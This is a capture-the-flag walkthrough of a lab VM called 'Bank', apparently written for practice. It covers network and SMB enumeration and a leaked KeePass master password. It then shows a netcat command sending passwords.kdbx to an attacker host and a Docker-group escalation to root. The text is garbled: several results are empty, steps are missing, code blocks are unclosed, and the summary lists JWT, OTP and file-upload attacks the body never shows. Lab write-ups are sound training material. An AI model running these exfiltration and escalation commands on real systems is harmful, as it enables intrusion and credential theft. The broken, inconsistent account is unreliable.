# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
sudo arp-scan --localnet
```

## Result

```text
$ sudo arp-scan  --localnet

```

The target machine IP address was identified as:

```text
172.29.112.170
```

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
nmap -n -Pn -sS -p- --min-rate 5000 172.29.112.170
```

## Scan Results

```text
$ nmap -n -Pn -sS  -p- --min-rate 5000   172.29.112.170
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 02:00 -0700

MAC Address: 00:0C:29:09:D5:97 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.29 seconds
```

### Findings

- Port **80** → HTTP
- Port **139** → NetBIOS
- Port **445** → SMB

The SMB service appeared particularly interesting and was selected for further enumeration.

---

# 🌐 Web Enumeration

Opening the website redirected the browser to:

```text
http://bank.nyx
```

Since the domain could not be resolved, add it to the `/etc/hosts` file:

```text
172.29.112.170 bank.nyx
```

After refreshing the page, the **Bank Alpha** website loaded successfully.

### Observation

A notice on the homepage stated:

```text
🚀 Coming Soon: Bank Alpha Public Launch Q3 2026
```

This suggested that the application was still under development and might contain security misconfigurations.

---

# 📂 Directory Enumeration

Use Gobuster to search for hidden directories:

```bash
gobuster dir -u http://bank.nyx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Result

# 🔍 SMB Enumeration

Enumerate SMB shares anonymously:

```bash
smbclient -L //172.29.112.170/ -N
```

## Result

# 📄 Information Disclosure

Reading the contents of `03-may-26.txt` revealed:

```text
Subject: AI Agent Integration & Development Environment Setup

To streamline and accelerate the development of the banking platform, we have decided to integrate a subscription-based AI agent into our workflow. 
The service has proven to be cost-effective; however, please be aware that the AI may occasionally produce incorrect or unexpected outputs. 
For this reason, it is important to maintain strict attention to security and validate all critical operations.

A dedicated development directory has been enabled where developers can access and test the application.
Dir: development-0119-d5e051a-9da2-12sdas1-775-e0174

Additionally, the system administrator user called Juan, hired by Lucas in recent days, is currently on a probationary training period within the company. 
He will be responsible for completing the configuration of the SMB service. While the service is already installed, some final setup steps are 
still pending. Please note that he is still gaining experience, so we kindly ask for patience and encourage collaboration and assistance if needed 
to ensure everything is properly configured.

Best regards,
Marcelo
```

# 🔍 Sensitive Files Discovery

While enumerating directories, the following files were discovered:

```bash
www-data@bank:/srv/smb/passwords$ ls
note.txt  passwords.kdbx
```

Read the note.txt:

```bash
cat note.txt
```

## Result

```text
Hey, as you said Marcelo, I’ve already left a KeePass file with all the system passwords you asked me to create, except for the root password. 
The KeePass password is: `@zm{2h8aUu'a_M;'Jd:!MAQ?zn

Delete it after reading, but don’t worry—I think I’ve configured this directory properly so only you can access 
it, and it’s not exposed on the SMB service either.

— Juan

```

### Important Finding

The KeePass master password was disclosed.

---

# 📥 Retrieving the KeePass Database

Transfer the database to the attacker machine.

## On Target

```bash
nc 172.29.112.76 4444 < passwords.kdbx
```

## On Attacker

```bash
nc -lvnp 4444 > passwords.kdbx
```

Open the database using **KeePassXC**.
To Install
```
sudo apt install keepassxc
```
To Open
```

# 🚀 Privilege Escalation via Docker

Enumerate available Docker images:

```bash
docker images
```

## Result

```text
marcelo@bank:/srv/smb/passwords$ docker images
REPOSITORY   TAG             IMAGE ID       CREATED       SIZE
debian       bookworm-slim   865980b94764   5 weeks ago   74.8MB
```

Since the user belongs to the Docker group, a container can be used to mount the host filesystem and obtain root access.

Execute:

```bash
docker run -v /:/host -it --rm debian:bookworm-slim chroot /host bash
```

---

# 👑 Root Access

Verify privileges:

```bash
marcelo@bank:/srv/smb/passwords$ docker run -v /:/host -it --rm debian:bookworm-slim chroot /host bash
root@d9a79b7c88f0:/# id ;
uid=0(root) gid=0(root) groups=0(root)
root@d9a79b7c88f0:/#

# 🧾 Summary

| Phase | Technique |
|---------|------------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| SMB Enumeration | Anonymous Share Access |
| Information Disclosure | Development Notes |
| Web Exploitation | JWT Analysis |
| Credential Recovery | Hash Cracking |
| Authentication Bypass | OTP Disclosure |
| Remote Code Execution | File Upload Bypass |
| Credential Harvesting | KeePass Database |
| Privilege Escalation | Docker Group Abuse |
| Root Access | Host Filesystem Mount |

---

# 🚀 Key Takeaways

- Anonymous SMB shares can expose sensitive development information.
- JWT tokens should never contain passwords or password hashes.
- Client-side file validation is not sufficient for upload security.
- Sensitive password databases should never be stored alongside plaintext credentials.
- Membership in the Docker group effectively grants root-level access to the host.
